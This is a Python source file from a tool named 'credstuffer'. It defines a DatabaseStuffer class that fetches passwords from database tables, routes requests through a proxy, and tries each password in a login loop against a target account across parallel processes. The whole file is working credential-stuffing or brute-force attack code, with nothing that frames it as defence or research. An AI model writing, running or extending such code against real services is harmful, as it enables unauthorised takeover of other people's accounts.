import logging
import multiprocessing
from time import sleep

from credstuffer.dbhandler import DBHandler
from credstuffer.stuffer import Stuffer


class DatabaseStuffer(Stuffer, multiprocessing.Process):
    """ class DatabaseStuffer to execute the stuffing algorithm with data from database

    USAGE:
            databasestuffer = DatabaseStuffer(account=account, schema_char='a', tables='abcdefghijklmnopqrstuvwxyz',
                                              **dbparams)
            databasestuffer.start()
    """
    def __init__(self, account, schema_char, tables='abcdefghijklmnopqrstuvwxyz', **dbparams):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('create class DatabaseStuffer')

        # init base classes
        Stuffer.__init__(self, account=account)
        multiprocessing.Process.__init__(self)

        self.schema_char = schema_char
        self.table_list = list(tables)
        self.dbparams = dbparams

    def run(self) -> None:
        """ executes the run process for account logins """

        # create database handler
        dbhandler = DBHandler(**self.dbparams)
        # set proxy to account
        self.set_account_proxy()

        # iterate over tables
        for table_char in self.table_list:
            if self.schema_char == 'symbols':
                self.logger.info("fetch data from {}.{}".format(self.schema_char, self.schema_char))
                passwords_data = dbhandler.fetch_data(schema=self.schema_char, table=self.schema_char)
            else:
                self.logger.info("fetch data from {}.{}".format(self.schema_char, table_char))
                passwords_data = dbhandler.fetch_data(schema=self.schema_char, table=table_char)
            for entry in passwords_data:
                if entry[0]:
                    password = entry[0]
                    # execute login
                    self.account_login(password=password)
                    sleep(0.001)






